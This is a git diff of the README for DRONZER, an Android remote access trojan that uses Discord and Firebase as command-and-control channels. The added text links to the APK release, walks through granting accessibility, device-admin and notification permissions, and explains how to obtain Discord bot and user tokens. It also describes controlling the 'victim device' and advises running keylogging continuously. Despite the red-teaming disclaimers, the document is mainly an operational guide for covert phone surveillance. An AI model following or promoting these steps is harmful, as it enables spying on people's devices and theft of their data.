@@ -15,10 +15,10 @@
 
 </div>
 
-# **DRONZER : Next-Gen Android RAT 🐺**
-DRONZER is an advanced **open-source** Android Remote Administration Tool (RAT) engineered to stress-test the security architectures of Android 15 and later. While modern OS updates introduce "Private Spaces" and enhanced sandboxing, DRONZER explores the limits of persistent access, data exfiltration, and UI-layer exploitation for educational and red-teaming purposes.
+# **DRONZER : A-RAT 🐺**
+***DRONZER is an advanced, open-source Android Remote Administration Tool (RAT) engineered to stress-test the security architectures of Android 15 and subsequent releases. While modern operating systems introduce sophisticated countermeasures—such as "Private Spaces" and enhanced sandboxing—DRONZER is designed to explore the technical boundaries of persistent access, data exfiltration, and UI-layer exploitation for educational and red-teaming applications. By utilizing Discord as a decentralized Command and Control (C2) server, DRONZER demonstrates how modern communication platforms can be leveraged for remote orchestration, providing security researchers with a functional framework to identify and mitigate high-level mobile vulnerabilities.***
 
-> [!WARNING] 
+> [ !WARNING ] ⚠️
 
 LEGAL DISCLAIMER: This software is for authorized security testing and research only. Deploying DRONZER on devices without explicit, written permission is strictly prohibited and likely a felony. Proceed with clinical objectivity.
 
@@ -34,7 +34,8 @@ Accessibility Hijacking: Exploits the AccessibilityService API to perform real-t
 Silent Telemetry: Periodically gathers system metadata, app usage patterns, and hardware identifiers (IMEI, Battery, Network state) and pushes them to remote listeners.
 
 ## **2. Multi-Vector Command & Control (C2Server)**
-Discord C2 Integration: Uses Discord as a stealthy, high-bandwidth C2 server. By leveraging the Discord Bot API, the framework can receive commands and dump logs into organized channels. (Discord is never used to perform such a tasks so if discord reviewed your server it has full right to ban/delete that server)
+Discord C2 Integration: Uses Discord as a stealthy, high-bandwidth C2 server. By leveraging the Discord Bot API, the framework can receive commands and dump logs into organized channels. 
+> *(Discord is never used to perform such a tasks so if discord reviewed your server it has full right to ban/delete that server).*
 
 Firebase Real-time Sync: Acts as a secondary, low-latency data bridge for immediate interaction logs.
 
@@ -111,7 +112,7 @@ Redundant Uplinks: Automatically switches between Firebase and Discord if one en
 </details>
 
 # **SETUP GUIDE**
-* Download latest apk version from [here](https://github.com/VintageAyu/DRONZER/releases/download/v6.0.0.7/DRONZER.apk).
+* Download latest apk version from [here](https://github.com/VintageAyu/DRONZER/releases).
 * Open the apk and it will redirect you to accessibility services, toggle it on. (always cross-check because it may show not working - in this case toggle off and on again)
 * Go back and it will ask you for device admin perms, allow it and it will ask you for permissions allow all, follow the steps
 * It will redirect you to read notification settings and all , go through it.
@@ -121,10 +122,46 @@ Redundant Uplinks: Automatically switches between Firebase and Discord if one en
 # **SETUP VIDEO**
 
 <div align="center">
-  <video src="https://github.com/user-attachments/assets/53b97e57-b7d6-4343-a204-a64b9a0a8a80" width="100%" controls muted autoplay loop>
+  <video src="https://github.com/user-attachments/assets/8ad4a089-7ab7-44a6-9b40-6bb49fa08d5f" width="100%" controls muted autoplay loop>
     Your browser does not support the video tag.
   </video>
 </div>
+
+# **HOW TO GET??**
+* Bot Token -> [Watch this Video](https://www.youtube.com/watch?v=zrNloK9b1ro). Just give Administrator permission to bot check [here](https://www.youtube.com/watch?v=zrNloK9b1ro&t=287s)
+* Webhook URL -> [Watch this video](https://www.youtube.com/watch?v=fKksxz2Gdnc).
+* ChannelID -> [Watch this video](https://www.youtube.com/watch?v=tJVtH05IGsU).
+* User Token -> [Watch this video](https://www.youtube.com/watch?v=WFtFy2Ia0x8).
+
+
+# **BEST PART**
+***Do you know? you can control the victim device from Host computer/PC  or by your Smartphones.***
+* PC : Go to the private server of yours and type "**!help**" there, it will list all the available commands. Use it manually.
+* Smartphones : Get the app on your phone and log-in it , go to **Devices** and press button on right bottom to scan for the target, once target is showing double tap to lock it. Navigate through different tabs to use different functions.
+
+## **MISCONCEPTION / DOUBT**
+*Victim can login with biometric (like host) and because if host is controlling DRONZER with smartphone victim can see their phone in devices tab and reverse attack on them... ?????*
+
+> NO! because you can modify it in settings to use biometric or not and its already toggled off by default you can also change credentials once logged in .
+
+## **WHAT IS THIS THING I SEE WHEN WEBHOOK RECEIVES A SIGNAL??**
+<div align="center">
+  <img src="assets/GUI.png" width="80%">
+</div>
+
+
+# **WHY DRONZER NEEDED TO BE DEVELOPED??**
+***The evolution of modern cybersecurity education required a tool that could visualize complex vulnerabilities in real-time, which is precisely why DRONZER was conceived. While the internet is filled with outdated software, DRONZER stands alone as a functional bridge for understanding mobile security on the latest operating systems. By utilizing DRONZER, users can witness the intricate mechanics of remote access, transforming abstract threats into a tangible, high-tech interface. Ultimately, DRONZER serves as a vital proof of concept, proving that awareness is the only true defense against the sophisticated digital architecture that DRONZER was designed to expose.***
+
+# **WHY I DIDN'T ADDED AUTO-PERMISSIONS??**
+***The omission of auto-permission features is a fundamental design principle intended to align DRONZER with ethical hacking standards and legal compliance. By requiring manual authorization, DRONZER serves as a transparent educational framework that highlights the critical role of user consent in mobile security architectures. This approach ensures that the project remains a legitimate tool for red-teaming and research, preventing the automation of unauthorized access while forcing users to engage with and understand the specific permission prompts that safeguard modern Android environments. Ultimately, this choice reinforces the project's mission of fostering informed awareness rather than facilitating illicit exploitation.***
+
+## **DEV SUGGESTION**
+* Enable 2FA for discord as discord resets User Token when you change password or turn on/off 2FA.
+* You can set the webhook URL to channel where you want to get data from client side and put different Channel ID where it will store all your (host) commands.
+* You can keep "**!keys**" command to run 24/7 but never run cam/mic everytime it can ban you because of discord rate limits.
+
+
 
 ### Machine:
 <div display="flex">
